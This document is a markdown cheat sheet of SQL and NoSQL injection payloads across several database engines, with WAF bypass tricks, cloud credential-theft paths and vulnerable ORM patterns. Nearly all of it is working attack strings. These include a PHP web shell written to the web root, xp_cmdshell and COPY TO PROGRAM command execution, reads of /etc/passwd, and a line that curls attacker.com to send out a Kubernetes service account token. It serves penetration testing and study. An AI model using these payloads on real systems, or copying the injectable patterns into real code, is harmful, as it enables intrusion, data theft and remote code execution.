# SQLi Payloads & Bypass Techniques

Quick-reference for SQL injection testing across DB engines, input vectors, and WAF bypass.

## Detection Probes

### All Input Vectors (params, POST, cookies, headers, API filters, WebSocket)

```
' " ; -- /* */ # ) ( + , \  %
' OR '1'='1
" OR "1"="1
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Boolean Blind

```sql
' OR 1=1 --
' OR 1=2 --
' AND 1=1 --
' AND 1=2 --
```

### Time-Based Blind

```sql
' OR SLEEP(5) --                          -- MySQL
' OR pg_sleep(5) --                       -- PostgreSQL
' WAITFOR DELAY '0:0:5' --               -- MSSQL
'; BEGIN DBMS_LOCK.SLEEP(5); END; --     -- Oracle
```

### JSON Operator Probes

```sql
id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1   -- MySQL
id=1 AND '{"a":1}'::jsonb ? 'a'             -- PostgreSQL
```

### GraphQL → SQLi

```json
{"query":"query{ users(filter: \"' OR 1=1 --\"){ id email }}"}
```

### WebSocket SQLi

```javascript
ws.send('{"action":"search","query":"test\\\' OR 1=1--"}');
```

### REST API Filter Injection

```json
{"filter": {"name": {"$regex": "admin' OR 1=1--"}}, "sort": "name'; DROP TABLE users--"}
```

---

## UNION Exploitation

### Column Count

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Schema Enumeration

```sql
-- Version
' UNION SELECT @@version --              -- MySQL/MSSQL
' UNION SELECT version() --              -- PostgreSQL
' UNION SELECT banner FROM v$version --  -- Oracle

-- Tables
' UNION SELECT table_name,1 FROM information_schema.tables --
' UNION SELECT table_name,1 FROM all_tables --              -- Oracle

-- Columns
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' --
```

### Blind Extraction

```sql
-- Boolean char-by-char
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'-- -

-- Time conditional
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- -
```

---

## DB-Specific Exploitation

### MySQL

```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
```

### MSSQL

```sql
'; EXEC xp_cmdshell 'net user' --
'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName' --
'; EXEC ('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Server=linked_server;Trusted_Connection=yes'',''SELECT 1'')') --
```

### PostgreSQL

```sql
' UNION SELECT pg_read_file('/etc/passwd',0,1000) --
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; --
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'; --
```

### Oracle

```sql
' UNION SELECT * FROM SYS.USER_ROLE_PRIVS --
' BEGIN DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec(''cmd.exe /c dir'')'); END; --
```

---

## NoSQL Injection

### MongoDB

```
username[$ne]=admin&password[$ne]=
username[$regex]=^adm&password[$regex]=^pass
{"$where": "sleep(5000)"}
{"username": {"$in": ["admin"]}}
```

### Neo4j / Cypher

```cypher
MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u
```

---

## WAF Bypass

| Technique | Example |
|-----------|---------|
| Case variation | `SeLeCt`, `UnIoN` |
| Comment injection | `UN/**/ION SE/**/LECT` |
| URL encoding | `%55%4E%49%4F%4E` |
| Hex encoding | `0x53454C454354` |
| Whitespace alt | `UNION/**/SELECT` |
| Null byte | `%00' UNION SELECT...` |
| Double encoding | `%252f` |
| String concat | MySQL: `CONCAT('a','b')`, Oracle: `'a'||'b'`, MSSQL: `'a'+'b'` |
| JSON wrapper | `/**/{\"a\":1}` prefix |
| HTTP/2 smuggling | HPACK compression obscures payloads from perimeter WAFs |

SQLmap tampers: `--tamper=space2comment,charencode` — combine multiple for layered WAFs.

---

## Cloud SQLi Paths

```sql
-- AWS IMDSv1
' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name') --

-- Azure xp_cmdshell
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'az vm list'; --

-- Lambda connection pool poisoning (SET ROLE persists across invocations)
-- Injectable: await db.query(`SET ROLE '${event.role}'`)
```

---

## ORM Vulnerabilities (2023-2025)

| ORM | Vulnerable Pattern |
|-----|--------------------|
| Sequelize | `sequelize.literal(\`name = '${input}'\`)` |
| TypeORM <0.3.12 | `repository.findOne({ where: \`id = ${id}\` })` |
| Hibernate 6.x | `session.createQuery("FROM User WHERE name = '" + input + "'")` |
| Prisma <4.11 | `prisma.$executeRawUnsafe(\`SELECT * WHERE id = ${id}\`)` |

---

## Quick Reference

| DB | Version | Time Delay | Concat | Schema |
|----|---------|-----------|--------|--------|
| MySQL | `@@version` | `SLEEP(5)` | `CONCAT()` | `information_schema` |
| MSSQL | `@@version` | `WAITFOR DELAY '0:0:5'` | `'a'+'b'` | `information_schema` / `sys` |
| PostgreSQL | `version()` | `pg_sleep(5)` | `'a'||'b'` | `information_schema` |
| Oracle | `v$version` | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` | `'a'||'b'` | `all_tables` |
